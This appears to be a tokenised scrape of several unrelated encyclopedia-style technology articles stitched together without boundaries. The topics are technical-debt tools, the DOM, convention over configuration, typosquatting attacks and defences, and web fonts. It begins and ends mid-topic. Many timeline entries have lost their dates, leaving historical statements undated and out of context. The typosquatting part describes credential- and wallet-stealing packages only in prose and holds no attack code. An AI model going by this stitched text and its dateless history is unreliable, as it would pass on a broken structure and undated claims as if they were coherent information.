The Agile Manifesto is signed .
In the following years , the concept of technical debt was more widely adopted with the growth of the Agile movement .
The first lines of code are written for the Sonar platform .
In November 2008 , SonarSource was founded to accelerate development and adoption of the open source Sonar platform .
By mid-2010 , SonarSource gets regular downloads .
In April 2013 , SonarSource gets a commercial edition and is renamed SonarQube .
SQALE calculation of indices from remediation cost table .
Source : Letouzey and Coq 2010 , fig .
7 .
In a white paper , Letouzey and Coq introduce the SQALE ( Software Quality Assessment Based on Lifecycle Expectations ) Analysis Model .
They note that in qualimetry , any measure of software quality should be precise , objective and sensitive .
The SQALE model provides normalized measures and aggregated indices .
Since software is a hierarchy of artefacts , the model standardizes aggregation rules that lead to remediation indices .
Since SQALE is open - source and royalty free , by 2016 , it will be implemented by many tools .
Multiple studies are published in literature that attempt to understand technical debt and relate it to software quality .
A couple of these studies use SonarQube and its plugins for analysis .
Feature comparison of some technical debt management tools .
Source : Li et al .
2015 , table 16 .
Li et al .
bring together different studies and summarize the capabilities of 29 different technical debt management tools .
They map them to various attributes : identification , measurement , prioritization , monitoring , repayment , documentation , communication and prevention .
Most are able to identify or measure technical debt .
In addition , they capture what sort of technical debts these tools capture : code , design ( code smells or violations ) , testing , requirements , architecture , and documentation .
Jira allows tracking of technical debt items .
Source : Radigan 2015 .
In a blog post , Atlassian recognizes the importance of technical debt .
They note that their Jira software can now list and track technical debt , including when a debt was created and when it 's expected to be resolved .
DeepSource is released .
It 's a source code analysis tool that can integrate with GitHub .
Test coverage , documentation of debt , security , and dependency debt are some things it can capture .
A refactoring suggestion in SonarQube .
Source : Oswal 2019 , fig .
42 .
Oswal studies the support for technical debt with three tools : SonarQube , PMD and Code Analytix .
He notes that no single tool gives a holistic view and , therefore , he uses multiple tools for this analysis .
The study looks at the Core Java 8 project plus a web application ( Java / JavaScript / HTML / XML ) .
The study addresses software reliability , maintainability and security .
How DOM works .
Source : Mozilla 2020c .
Document Object Model ( DOM ) is the object - oriented representation of an HTML or XML document .
It defines a platform - neutral programming interface for accessing various components of a webpage , so that JavaScript programs can change document structure , style , and content programmatically .
It generates a hierarchical model of the HTML or XML document in memory .
Programmers can access / manipulate tags , IDs , classes , attributes and elements using commands or methods provided by the document object .
It 's a logical structure because DOM does n't specify any relationship between objects .
Typically , you use DOM API when documents can fit into memory .
For very large documents , streaming APIs such as Simple API for XML ( SAX ) may be used .
The W3C DOM and WHATWG DOM are standards implemented in most modern browsers .
However , many browsers extend these standards .
Web applications must keep in view the DOM standard used for maintaining interoperability across browsers .
What are the different components of a DOM ?
DOM tree and its components .
Source : Wikipedia 2020 .
The purpose of DOM is to mirror HTML / XML documents as an in - memory representation .
It 's composed of : a set of objects / elements Hierarchical structure to combine objects An interface to access / modify objects . DOM lists the required interface objects , with supported methods and fields .
DOM - compliant browsers are responsible for supplying concrete implementation in a particular language ( mostly JavaScript ) .
Some HTML DOM objects , functions & attributes : Node - Each tree node is a Node object .
Different types of nodes inherit from the basic ` Node ` interface .
The Document - root of the DOM tree is the HTMLDocument node .
usually available directly from JavaScript as a document or window .
It gives access to properties associated with a webpage such as URL , stylesheets , title , or characterSet .
The field ` document.documentElement ` represents the child node of type ` HTMLElement ` and corresponds to the ` & lt;html > ` element .
Attr – An attribute in an ` HTMLElement ` object providing the ability to access and set an attribute .
It has names and value fields .
Text — A leaf node containing text inside a markup element .
If there is no markup inside , text is contained in a single ` Text ` object ( only child of the element ) .
Can you show with an example how a web page gets converted into its DOM ?
HTML document and its equivalent DOM .
Source : Sakpal 2018 .
The simplest way to see the DOM generated for any webpage is using the " Inspect " option within your browser menu .
The DOM element navigation window that opens allows you to scroll through the element tree on the page .
You can also alter some element values and styles – text , font , colours .
Event listeners associated with each element are also listed .
The document is the root node of the DOM tree and offers many useful properties and methods .
` document.getElementById(str ) ` gives you the element with ` str ` as i d ( or name ) .
It returns a reference to the DOM tree node representing the desired element .
Referring to the figure , ` document.getElementById('div1 ' ) ` will return the first " div " child node of the " body " node .
We can also see that the " html " node has two direct children , " head " and " body " .
This example also shows three leaf nodes containing only text .
These are one " title " and two " p " tags .
Corresponding CSS and JavaScript files referenced from HTML code can also be accessed through DOM objects .
How is JavaScript used to manipulate the DOM of a web page ?
commonly used JavaScript DOM interfaces .
Source : Mozilla 2020b .
The ability to manipulate webpages dynamically using client - side programming is the basic purpose behind defining a DOM .
This is achieved using DHTML .
DHTML is not a markup language but a technique to make dynamic web pages using client - side programming .
For uniform cross - browser support of webpages , DHTML involves three aspects : JavaScript - for scripting cross - browser compatible code , CSS - for controlling the style and presentation , DOM - for a uniform programming interface to access and manipulate the web page as a document Google Chrome , Microsoft Edge , Mozilla Firefox and other browsers support DOM through standard JavaScript .
JavaScript programming can be used to manipulate the HTML page rendering , the underlying DOM and the supporting CSS .
List of some important DOM - related JavaScript functionalities : Select , Create , Update and Delete DOM Elements ( reference by ID / Name ) Style setting of DOM Elements – color , font , size , etc Get / set attributes of Elements Navigating between DOM elements – child , parent , sibling nodes Manipulating the BOM ( Browser Object Model ) to interact with the browser Event listeners and propagation based on action triggers on DOM elements Can DOM be applied to documents other than HTML or XML ?
By definition , DOM is a language - neutral object interface .
W3 clearly defines it as an API for valid HTML and well - formed XML documents .
Therefore , a DOM can be defined for any XML compliant markup language .
The WHATWG community manages the HTML DOM interface .
Some Microsoft specific XML extensions define their own DOM .
Scalable Vector Graphics ( SVG ) is an XML - based markup language for describing two - dimensional vector graphics .
It defines its own DOM API .
XAML is a declarative markup language promoted by Microsoft , used in the UI creation of .NET Core apps .
When represented as text , XAML files are XML files with ` .xaml ` extension .
By treating XAML as an XAML node stream , XAML readers communicate with XAML writers and enable a program to view / alter the contents of a XAML node stream similar to the XML Document Object Model ( DOM ) and the ` XmlReader ` and ` XmlWriter ` classes .
Standard Generalized Markup Language ( SGML ) is a standard for how to specify a document markup language or tag set .
The DOM support for SGML documents is limited to parallel support for XML .
While working with SGML documents , the DOM will ignore ` IGNORE ` marked sections and ` RCDATA ` sections .
What are the disadvantages of using DOM ?
The biggest problem with DOM is that it is memory intensive .
While using the DOM interface , the entire HTML / XML is parsed and a DOM tree ( of all nodes ) is generated and returned .
Once parsed , the user can navigate the tree to access data in the document nodes .
The DOM interface is easy and flexible to use but has an overhead of parsing the entire HTML / XML before you can start using it .
So when the document size is large , the memory requirement is high and initial document loading time is also high .
For small devices with limited on board memory , DOM parsing might be an overhead .
SAX ( Simple API for XML ) is another document parsing technique where the parser does n’t read the entire document .
Events are triggered when the XML is being parsed .
When it encounters a tag start ( e.g. ` & lt;sometag > ` ) , then it triggers the tagStarted event .
When the end of the tag is seen ( ` & lt;/sometag > ` ) , it triggers tagEnded .
So it 's better in terms of memory efficiency for heavy applications .
In earlier days , the DOM standard was not uniformly adopted by various browsers , but that incompatibility issue does n’t exist anymore .
What sort of DOM support is offered by React , Node.js and other JavaScript - based platforms ?
Everything in DOM is a node – document / element / attribute nodes , etc .
But if you have a list of 10 items on your webpage and , after some user interaction , need to update one of them , the entire DOM will be re - rendered .
This is especially troublesome in Single Page Applications ( SPAs ) .
The React WebUI framework solves this by creating a virtual DOM which is an in - memory data - structure cache for selective rendering .
Differences in the node rendering are computed , and the browser 's displayed DOM is updated efficiently , " reconciled " by the algorithm .
The NodeJS runtime environment has its own implementation for the DOM interface , used when we need to work with HTML on the server side for some reason .
The DOM ` Node ` interface is an abstract base class upon which many other DOM API objects are based , thus letting those object types to be used similarly and often interchangeably .
` jsdom ` is a pure JavaScript implementation of WHATWG DOM and HTML Standards for use with Node.js .
In the AngularJS scripting framework , there are directives for binding application data to attributes of HTML DOM elements .
Ex .
The ` ng - disabled ` directive binds AngularJS application data to the disabled attribute of HTML elements .
Brendan Eich and Netscape designed and released JavaScript , first supported in Netscape Navigator .
In subsequent years , JavaScript became one of the core technologies of the World Wide Web , alongside HTML and CSS .
All major web browsers have a dedicated JavaScript engine to execute it .
In 1997 , it was standardized as ECMAScript .
JScript has been introduced as the Microsoft dialect of the ECMAScript standard .
Limited support for user - generated events and modifying HTML documents in the first generation of JavaScript & JScript is called " DOM Level 0 " or Legacy DOM .
No independent standard has been developed for DOM Level 0 , but it 's partly described in the specifications for HTML 4 .
Netscape and Microsoft released version 4.0 of Netscape Navigator and Internet Explorer respectively .
DHTML support is added to enable changes to a loaded HTML document .
DHTML requires extensions to Legacy DOM implementations but both browsers developed them in parallel and remain incompatible .
These versions of the DOM later became known as the Intermediate DOM .
The W3C DOM Working Group banked a standard DOM specification , known as DOM Level 1 , that became the W3C Recommendation in 1998 .
This is after the standardization of ECMAScript .
Microsoft Internet Explorer version 6 comes out with support for W3C DOM .
Mozilla comes out with its Design Principles for Web Application Technologies , the consensus opinion of the Mozilla Foundation and Opera Software in the context of standards for Web Applications and Compound Documents .
This defines browser code compatibility with HTML , CSS , DOM , and JavaScript .
Large parts of W3C DOM are well - supported by all the common ECMAScript - enabled browsers , including Safari and Gecko - based browsers ( like Mozilla , Firefox , SeaMonkey and Camino ) .
The HTML DOM living standard is a constantly updated standard maintained by WHATWG.org , with latest updates happening continuously .
A cartoon showing how convention simplifies understanding .
Source : Geek & Poke 2008 .
It 's often necessary to configure a software project correctly before it can be used .
For example , the IDE or the build tool should know where to find the source files .
It should know where to look for dependencies or save the output of a building .
In web applications , it should know how to connect URL paths to application logic , and database tables and columns .
In a configuration approach , all this information is supplied via configuration files , often as XML / YAML / JSON files .
However , writing and maintaining these files can be tedious .
In a convention approach , reasonable defaults are used .
The conventions are well defined .
Once developers learn and use these conventions , they can focus on more important tasks instead of maintaining configuration files .
Many frameworks have adopted Convention over Configuration ( CoC ) while also giving developers means to override the defaults .
Could you explain convention over configuration with some examples ?
An introduction to CoC in ASP.NET MVC .
Source : VTC 2018 .
In ASP.NET MVC , the convention is to have the folders ` Controllers ` , ` Models ` and ` Views ` .
Accessing the homepage routes to the ` HomeController ` class in file ` Controllers / HomeController.cs ` where the ` Index ( ) ` method is called .
This method returns a view that 's in the file ` Views / Home / Index.cshtml ` .
All this " magic " happens due to conventions on folder structure and naming .
No configuration files are needed to tell the framework how all these parts are " wired together " .
In a Java project built with Gradle , with a single line of code , we can apply the Java plugin to this project .
Gradle then automatically looks for source code in ` /src / main / java ` .
It creates a ` /build ` folder where the compiled class and JAR files are saved .
This is all by convention .
We do n't have to tell Gradle these mundane details via configuration files .
In pytest , a Python - based test framework , test cases are automatically discovered .
The framework looks at the current directory for ` test_*.py ` or ` * _ test.py ` files .
In those files , it picks out functions or methods with the prefix ` test ` .
For methods , it picks out classes with the prefix ` Test ` .
In what aspects of software is convention over configuration applicable ?
Examples of CoC in Ruby on Rails .
Source : Krzywda 2020 .
In Ruby on Rails , CoC can be seen in many areas within its Model - View - Controller architecture .
Model class names are derived from database table names .
Class attributes are based on database column names .
View filenames and templates are based on controller action names .
A web URL is mapped into the controller class by CoC. Many other design patterns benefit from CoC. By implementing an ASP.NET interface according to a defined convention , we can easily create a message handler without any further configuration .
To support dependency injection , many frameworks adopt CoC to greatly simplify wiring of dependencies .
Build systems such as Maven make use of CoC. For example , paths to source code , resources , tests and many others are specified by defaults .
Maven 's core plugins also apply defaults for " compiling source code , packaging distributions , generating web sites , and many other processes " .
API endpoints designed by different developers can look and behave differently .
By adopting CoC , APIs become more standardized and simpler to use .
JSON - API is an example that specifies shared conventions .
In test frameworks such as pytest , conventions are used to discover test cases .
What are the benefits of convention over configuration ?
Some benefits of CoC. Source : Văn 2014 , 1:26 .
CoC frees developers from making mundane decisions , such as whether to name a database column ` i d ` , ` postId ` , ` posts_id ` or ` pid ` .
Developers can focus on application logic or develop deeper abstractions .
CoC makes it easier for beginners to get productive without having to read a lot of the existing codebase .
It 's easier to collaborate since developers follow the same conventions .
When applied to design patterns ( such as dependency injection ) , CoC makes code less verbose , more readable , and more maintainable .
A code that does only " housekeeping " can be eliminated .
Ultimately , CoC lets developers focus on delivering functionality rather than dealing with low - level infrastructure .
Often , adding new functionality is easier .
There 's no need to update configuration files .
Conventions either at the language level or framework level take care of the " wiring " .
The CoC philosophy can be extended to engineering disciplines .
An example is model - driven engineering ( MDE ) .
The idea is to abstract away low - level details so that developers can focus on higher - level design and implementation decisions .
Code generators can use conventions to generate low - level code .
Which are some frameworks that adopt convention over configuration ?
Among MVC web frameworks that adopt CoC are Ruby of Rails , ASP.NET MVC , CakePHP , Laravel , Symfony , Yii , Grails , Ember.js , Meteor , Nest.js , and Spring Framework .
Among the built systems using CoC are Maven and Gradle .
What are some criticisms of convention over configuration ?
Frameworks that adopted CoC are called opinionated .
One common criticism is that you 're forced to follow a convention you may not like .
However , frameworks often allow developers to customize .
Too much convention leads to confusion and a steeper learning curve .
Too little convention gives more freedom but at the cost of complexity .
The key is , therefore , to achieve the right level of convention .
Unless you know the framework well , reviewing other people 's code is harder ; and searching through files wo n't help .
For example , finding out how a URL maps to a controller or a view can be challenging .
For beginners , the code may not be obvious .
As a solution , it 's better to limit CoC to conventions that are commonly understood and frequently used .
If you override conventions , document them explicitly .
CoC can lead to unexpected behaviour .
For example , ASP.NET finds classes inherited from a base Controller class .
If the project references an assembly that has controllers , we may unknowingly expose those endpoints .
This is one instance why some prefer explicit configuration , such as in Python and Django .
The first version of Ruby on Rails has been released .
Convention over configuration is one of the pillars of Ruby on Rails .
It brings " default structures for web pages , databases , and web services " .
Inspired by this , Sensio Framework was launched as a PHP MVC framework that adopts CoC. This was later renamed Symfony .
Enterprise JavaBeans ( EJB ) 3.0 has been released .
To overcome the complexity of earlier releases , EJB 3.0 adopts CoC by way of annotations .
Microsoft releases the first version of ASP.NET MVC .
Although ASP.NET itself started in 2002 and the MVC pattern was common by 2003 , ASP.NET MVC formalizes it .
ASP.NET MVC adopts CoC , taking inspiration from Ruby on Rails .
It 's in response to declarative XML configuration that 's being overused .
Jimmy Bogard releases v1.0 of AutoMapper that 's described as " a convention - based object - object mapper on .NET " .
Typosquatting on ' google.com ' .
Source : Whois XML API 2020 ?
Typosquatting is the malicious practice of registering domain names that closely resemble popular brands and businesses .
Attackers do this in the hope of deceiving users .
A user might mistype the web address and land up on a malicious site .
The site may show harmless ads .
More seriously , it might look like a genuine site .
The user may then perform transactions and thereby disclose sensitive information .
Typosquatting can also be done on software packages .
Developers might unknowingly download and install malicious packages .
This compromises the security of their applications .
Typosquatting could be combined with other cyberattacks such as phishing .
Domain owners , developers and users have to take precautions to protect themselves against typosquatting .
What aspects of software can be attacked by typosquatting ?
Typosquatting can occur on domain names .
This is sometimes called DNS Typosquatting or URL hijacking .
Suppose a user wishes to visit ` live.com ` but mistypes this as ` livve.com ` , ` live.cm ` or ` liv.ecom ` .
This is not exactly harmful if such domains do n't exist .
However , attackers can register these domains and thereby redirect requests meant for ` live.com ` to their own servers .
This compromises the intended client - server interaction .
The Software supply chain is about how software packages are distributed by developers and downloaded by other developers for use in their applications .
A developer wishing to use a package may mistype the name and thereby install the wrong package .
The wrong package had been shared by the attacker .
Thus , instead of installing ` atlas_client ` , the developer may install ` atlas - client ` that contains malicious code .
Thus , we have domain typosquatting or package typosquatting .
In either case , typosquatting makes sense for highly popular domains or packages .
Even if a small proportion of users make a typo error , the attackers stand to benefit a great deal .
What are some variations or techniques in typosquatting ?
Some typosquatting techniques .
Source : Adapted from Adelia Risk 2020 .
Let 's assume that the correct domain name is " cisecurity.org " .
Here are some typosquatting variations , some of which can be easily mistyped by users : Omission : " csecurity.org " where the first " i " is omitted .
Addition : " cissecurity.org " where an extra " s " is added .
Substitution : " cisecurlty.org " where " l " fills in for an " i " .
Another example is " cisecurity.com " .
Transposition : " csiecurity.org " where " i " and " s " positions are swapped .
Hyphenation : " ci-security.org " where there 's an extra hyphen .
These variations can be described differently .
Assuming that the domain is " google.com " , we can have misspelling ( goggle.com ) , extra period ( goo.gle.com ) , confusion between numbers and letters ( g00gle.com ) , phrasal change ( googles.com ) , or additional words ( googlesearch.com ) .
Which are some advanced typosquatting techniques ?
Here are some advanced typosquatting techniques : Homograph Attacks : This relies on visual similarity .
For example , uppercase " i " in sans - serif font looks similar to " l " .
Another example is " у " , which is actually the Cyrillic U that looks like Latin " y " .
However , this sort of attack is not that common .
Bitsquatting : This relies on computer hardware to make errors at bit level .
For example , " microsoft.com " could be typosquatted as " mic2osoft.com " , with one bit in error ( 0x32 for " 2 " and 0x72 for " r " ) .
Soundsquatting : When two words sound similar but are spelled differently , users can end up picking up the incorrect one .
For example , " ate " may be mistaken for " eight " .
Typosquatting Cross - Site Scripting ( TXSS ) : This relates to software developers who use the wrong domain name in their code .
For example , they might mistype the URL of a JavaScript library that they wish to use on a HTML page .
This is a severe problem since every user visiting the page gets exposed to the typosquatting domain .
What harm can domain typosquatting cause to systems and businesses ?
Typosquatting and redirection are used to inject malware into systems .
Source : x0rz 2017 .
Popular brands lose traffic as their users get redirected to typosquatting domains .
In fact , traffic can get redirected to competitor sites .
Data theft can erode brand value .
In 2011 , variations of YouTube.com appeared and these were redirected to a survey form that collected mobile numbers from unsuspecting users .
The " survey " lured users to an SMS subscription that was charged to their phone bills .
In another example , omitting a dot in an email address resulted in the loss of 120,000 emails from Fortune 500 companies over six months .
These emails contained trade secrets and invoices .
Typosquatters can abuse affiliate programs and collect referral fees on behalf of genuine site owners .
Users can be tricked into downloading malware .
When typosquatting sites look exactly like their genuine counterparts , users may be tricked into entering login credentials and disclosing sensitive information .
Some typosquatting sites are less harmful .
For example , a company offering vacation packages may typosquat on the domains of major airlines and show ads for vacation packages .
It 's been found that financial services , retail and critical infrastructure are industries most affected by typosquatting .
Which are some best practices to protect against domain typosquatting ?
Check for HTTPS and domain name before the URL .
Source : NASA FCU 2019 .
If you have a domain , one defensive technique is to register common variations and typo errors of that domain .
Implement two - factor authentication ( 2FA ) for the safety of your customers .
Always use SSL certificates so that customers can verify site ownership .
Educate your users so that they 're aware of common attacks .
Having a trademark gives you the option to file a case against typosquatters .
Improve SEO on your site so that search engines rank it better than the typosquatted ones .
As a user , enable 2FA for better protection of your accounts .
When sensitive information or money transfer is involved , it 's better to verify by call before performing the online transaction .
Pay attention to how domains are spelled , in URLs and email addresses .
Check that the site is served on HTTPS .
It 's equally important to check the domain name that browsers display before the URL .
Avoid typing out URLs .
Instead , bookmark the sites you often visit and use these bookmarks instead .
In addition , you can install suitable browser plugins that warn about potential typosquatting domains on mistyped URLs .
What tools or algorithms are available to counter domain typosquatting ?
DNS Twist can " detect typosquatters , phishing attacks , fraud , and brand impersonation .
" By running DNSTWIST on your domain , you can find if it 's being typosquatted .
First released in 2006 , Microsoft provides Strider URL Tracer to investigate third - party domains .
This also generates typosquatted variations and scans them .
Some typos are more likely than others .
A probabilistic analysis helps in ranking them .
Typing test tools and human - based computation games can help estimate the probabilities .
For example , adjacent characters on the keyboard are more likely to be swapped .
Feature engineering is an essential task when building your own detection algorithm .
Features could be based on domain average TTL value , domain - IP address association , common ASNs shared by IP addresses , hit - count of domain , n - gram distribution of characters in domain name , and many more .
A lot of information can be obtained from DNS records , WHOIS lookup , and even crawling the site .
Algorithms could be knowledge - based where experts identify and apply features .
With sophisticated attacks , machine learning - based algorithms are more effective .
They 're data - driven .
ML for domain typosquatting is possible due to easily available data that 's collected by ISPs and network administrators .
What are some AI / ML approaches to detecting typosquatting domains ?
Detect typosquatting domains via feature selection and bagging ensemble model .
Source : Moubayed et al .
2020 , fig .
2 .
Among the ML approaches are : Supervised : Relies on labelled datasets .
DomainProfiler is an example that uses 55 features along with a random forest algorithm .
The limitation is that labelled datasets are expensive to create .
Semi - Supervised : Uses both labelled and unlabelled data .
Graph - based inference methods such as belief propagation are used in which it 's assumed that malicious hosts are most likely to communicate with malicious domains .
Another approach is clustering based on co - occurrence patterns such as domain names often seen together in DNS resolver logs .
Unsupervised : Clustering is done to identify at least two clusters of malicious or benign domains .
This is then extended to identify sub - clusters based on the type of malicious behaviour .
In practice , hybrid approaches are adopted to achieve better results .
For example , one approach used three different feature selection methods , reduced them to a subset of features , and trained a bagging ensemble model .
Two ensemble models were explored : decision tree and k - nearest neighbour .
For evaluation of these algorithms , accuracy , precision , recall , F1-score and AUC are commonly reported .
What harm can package typosquatting cause to applications and their users ?
In software package management , typosquatting can be used to steal cryptocurrency .
Malicious packages can attempt to redirect cryptocurrency payments to a wallet address of their choice .
This has been seen in Ruby ( via RubyGems ) and JavaScript ( via npm ) .
When a typosquatting package is installed , it gets access to environmental variables .
Such packages then attempt to steal user credentials and other secrets that are usually part of the environment .
A well - known example of this ( from August 2017 ) is ` crossenv ` typosquatting on ` cross - env ` at npm .
In PyPI , two typosquatting packages attempted to steal GPG and SSH keys from developers .
The typical exploit is to run arbitrary code during installation .
Worse still is when such an execution is done with administrative privileges .
Some packages may even attempt to inject malicious code into the application 's source code .
A less harmful attack is to replicate the original functionality and thereby divert attribution from the original package .
In npm , typosquatting package ` asimplemde ` does this for ` simplemde ` .
What can I do to prevent package typosquatting ?
Developers must be more vigilant when copying and pasting package names .
Use safe options when installing dependencies .
For example , use the ` --ignore - scripts ` option when installing using npm .
Developers should use digital signatures ( using ` gpg ` ) and checksums ( using ` sha256sum ` ) to deliver their software packages in a secure way .
This prevents hackers from modifying the content to include typosquatted names .
Package repositories , for their part , can have checks and rules that minimize the attack surface .
For example , npm requires that new packages ca n't match existing package names with the punctuation removed .
Given ` react - native ` , the names ` react_native ` and ` re.a_ct - native ` are not allowed .
Repositories can also maintain a list of possible names with small Levenshtein distances .
Administrators can be notified if there 's an attempt to install one of these .
In fact , server logs would contain 404 errors for non - existing packages that users typed by mistake .
These can be added to the list to proactively prevent typosquatting .
SpellBound is a tool that can be used to detect typosquatting names .
It adds a runtime overhead of less than 2.5 % .
R.C. Cumbow in The New York Law Journal uses the term typosquatter , probably the first published use of the term .
Seeing the growing threat of domain typosquatting , the Internet Corporation for Assigned Names and Numbers ( ICANN ) introduced the Uniform Domain Name Dispute Resolution Policy ( UDRP ) .
In the U.S. , there 's also the Anti - cybersquatting Consumer Protection Act ( ACPA ) .
In what is possibly one of the first large - scale studies , Benjamin Edelman identifies 8,800 typosquatted domains .
Many of these have invalid WHOIS data , provide explicit sexual content and even prevent users from exiting the site .
Many of these sites are registered to John Zuccarini , who was eventually arrested in September .
As part of RFC 3490 , the IETF defines an Internationalized Domain Name ( IDN ) .
This allows domain names to contain alphabet - specific characters .
This unfortunately opens the doors to homograph attacks .
English domain names could be typosquatted by substituting some letters with non - Latin letters that have identical glyphs ( same visual appearance ) .
Top six domain parking services with typosquatted domains .
Source : Wang et al .
2006 , fig .
1 .
An analysis of the top 10,000 domains shows that 30 % of all missing - dot typos come from just six domain parking services .
These six account for 2995 typosquatted domains .
In all , 5094 typosquatted domains are found to be active .
Banerjee et al .
observe that about 99 % of all typosquatted domains use one - character modification .
More formally , such a domain differs from the real domain by a Damerau - Levenshtein distance one .
They also propose ways to automate typosquatted domain name generation : 1-mod - inplace , 1-mod - deflate , 1-mod - inflate .
At the BlackHat Technical Security Conference , Artem Dinaburg reveals bitsquatting as a technique towards typosquatting .
Random bit errors in domain names can cause computers to fetch content from bitsquatted domains .
With 30 bitsquatted domains , he finds 52,317 requests from 12,949 unique IP addresses over a period of eight months .
An example of this is " www.mic2osoft.com " .
Typical use is to serve ads , abuse affiliate programs or install malware .
Framework for detecting typosquatting domains .
Source : Szurdi et al .
2014 , fig .
2 .
Szurdi et al .
propose a framework to detect typosquatting domains .
They start with passive data sources from which they generate possible typosquatting domain names .
To obtain more information , they actively crawl through the WHOIS database , collect DNS data and obtain web page content .
They cluster domains based on various features .
Their approach is called Yet Another Typosquatting Tool ( YATT ) .
Levenshtein distances among package names on npm .
Source : Burbidge 2018 .
One researcher investigates package names on npm in terms of Levenshtein distance .
He finds that 46 % of names are at a distance of two or less .
The longer the name , the less likely it has a distance to another name .
Distance of one can indicate typosquatting .
However , npm 's preference for short names makes this hard .
There are many genuine packages that have small distances : ( preact , react ) , ( bocha , mocha ) , and ( class - names , classnames ) .
A network of malicious sites ending in " .cm " is discovered .
These sites were typosquatting on many popular " .com " sites and attempting to trick users with fake security alerts .
Four years of access logs from this network were also discovered and analyzed by security experts .
They found that within the first three months of 2018 , these sites got about about 12 million visits , almost 50 million visits per year .
Typosquatting names are found in the RubyGems repository .
Source : Lakshmanan 2020 .
Packages for Ruby ( called gems ) are distributed via the RubyGems repository .
An analysis by ReversingLabs finds more than 700 malicious gems due to typosquatting .
They describe the example of ` atlas_client ` typosquatting as ` atlas - client ` .
It contains ` aaa.png ` that 's in fact a portable executable .
It contains a Base64 encoded VBScript .
It 's designed to steal cryptocurrency by modifying wallet addresses .
A selection of web fonts from Google Fonts .
Source : Agarwal 2012 .
Web designers often wish to be creative with typography , which really means that they wish to use non - standard and even custom - designed fonts to convey their message in a particular way .
Web fonts enable them to achieve this by allowing web pages to link to and download fonts on the web .
Previously , designers were limited by a few fonts installed on a user 's computer .
This is no longer the case with web fonts .
The format of font files ( WOFF , WOFF2 , and more ) and how browsers behave while fonts are being downloaded are some aspects that are standardized by W3C. In CSS3 , these details are specified in the CSS Fonts Module Level 4 document .
Since their introduction in 2009 , web fonts have gained tremendous popularity .
Hundreds , if not thousands , of fonts are available at the disposal of web designers .
What 's the need for web fonts ?
Historically , web pages could be rendered only in system fonts , that is , fonts installed on the user 's computer .
This meant that even if a web designer chose to use a certain font , there was no guarantee that the user would view the content in that font .
CSS ` font - family ` property accounted for this by providing fallback fonts .
Consider the CSS rule ` font - family : Helvetica , " Trebuchet MS " , Verdana , sans - serif ; ` .
The browser looks for the Helvetica font .
If not found , it look for Trebuchet MS , and so on .
Thus , text would be rendered but not necessarily in the designer 's preferred font of Helvetica .
The web community attempted to address this by creating a list of web - safe fonts .
These are fonts that are likely to be available on most computers .
Designers who used only these fonts could achieve consistent styling regardless of the device .
Arial or Helvetica , Times New Roman or Times , Courier New or Courier are web safe .
More web safe fonts include Verdana , Georgia , Palatino , Garamond , Bookman , and Avant Garde .
However , the list of web - safe fonts is still small .
This is where web fonts become relevant .
Which are some web services offering downloadable web fonts ?
Many web font services are available , offering a mix of free and paid fonts : Google Fonts , The League of Movable Type , Font Fabric , Lost Type Co - op , Font Squirrel , Font Spring , MyFonts , dafont , Typekit , Fontdeck , Webtype , Open Font Library , FontSpace , Befonts , Fonts for Web , Adobe Fonts , Fonts.com , and Brick .
Since its launch in 2010 , Google Fonts has been popular .
Google offers a directory for browsing and downloading fonts .
There 's also an API that developers can call from CSS stylesheets .
This enables browsers to download the specified font when required by a web page .
Typekit was launched in 2009 , acquired by Adobe in 2011 , and is now part of Adobe Fonts .
Typotheque , also started in 2009 , is an alternative .
For commercial fonts , Typotheque issues a license key that 's linked with the domains that are meant to use them .
This license key is part of the URL when downloading the font .
Icons can also be delivered as web fonts .
Font Awesome is a well - known source for icon fonts .
Which are some popular web fonts ?
Top 5 popular web fonts at Google Fonts .
Source : Google Fonts 2020 .
While many sites and blogs recommend dozens of web fonts , this list is based on actual downloads as of August 15 , 2020 .
An analytics dashboard on Google Fonts shows that the top ten downloads ( 7 days ) are for Roboto , Open Sans , Lato , Oswald , Montserrat , Roboto Condensed , Slabo 27px , Source Sans Pro , Raleway , and PT Sans .
On Font Squirrel , the most downloaded fonts are Open Sans , Montserrat , Roboto , Raleway , Great Vibes , Bebas Neue , Alex Brush , Quicksand , Lato and Pacifico .
Fonts.com lists the following all time bestselling web fonts : Neue Helvetica , Proxima Nova , Avenir , Avenir Next , Futura PT , Futura , Helvetica , Univers , Museo Sans and Sofia Pro .
The bestselling fonts ( 30 days ) at MyFonts.com are Neue Helvetica , Gilroy , Proxima Nova , Avenir Next , FF DIN , Helvetica , Avenir , Helvetica Now , Milliard , and ITC Avant Garde Gothic .
How can I include a web font for my web page ?
Here 's an example of using Google Fonts , but the approach is similar to other web font services .
You can even download the font file and serve it from your own server .
One method is to link to a CSS file from HTML using the ` & lt;link > ` tag .
This CSS file would contain details of the font , including the URL of the actual font files , typically in WOFF or WOFF2 file formats .
For example , the HTML page points to the CSS file ` https://fonts.googleapis.com/css?family=Tangerine ` , which contains the URL ` https://fonts.gstatic.com/s/tangerine/v11/IurY6Y5j_oScZZow4VOxCZZM.woff2 ` .
An alternative is to download the web font from within another CSS file or within a ` & lt;style > ` tag using ` @import https://fonts.googleapis.com/css?family=Tangerine ; ` .
Text can be styled in CSS to use the web font , such as , ` body { font - family : ' Tangerine ' , serif ; } ` .
This can be in HTML within a ` & lt;style > ` tag or part of a separate CSS file .
How do I use the CSS property " font - display " for web fonts ?
Comparing values for font - display .
Source : Graham 2020 .
Within the ` @font - face ` CSS rule , the ` font - display ` property is applicable .
It takes these values : ` auto ` : Default .
It allows the browser to apply its own default .
It is often similar to ` block ` .
` block ` : Text is hidden until the font is loaded .
This results in Flash of Invisible Text ( FOIT ) .
` swap ` : Tells the browser to use a fallback until the font is loaded .
This results in Flash of Unstyled Text ( FOUT ) .
` fallback ` : A compromise between ` auto ` and ` swap ` .
The browser will hide text for a while and then fallback if the download takes longer .
If download takes too long , the browser will stay with fallback .
` optional ` : Like ` fallback ` but the browser may ignore the font on slow connections .
Among web designers , neither FOIT nor FOUT are satisfactory .
FOIT is closer to the original design but users have to wait longer to read the content .
With FOUT , users can read the content earlier but with a different user experience .
In any case , with ` font - display ` , designers get to choose .
A related behaviour is Flash of Faux Text ( FOFT ) in which ` font - synthesis ` is used to render bold / italic variations while the true bold / italics are loaded .
For better performance , what 's the best strategy for downloading web fonts ?
Different font loading strategies .
Source : Leatherman 2016b .
It 's possible to remove web fonts from the critical path .
This could be done by lazy loading them until after the complete document is loaded .
However , this only delays the FOIT that happens anyway when download is in progress .
Hence , lazy loading is not recommended .
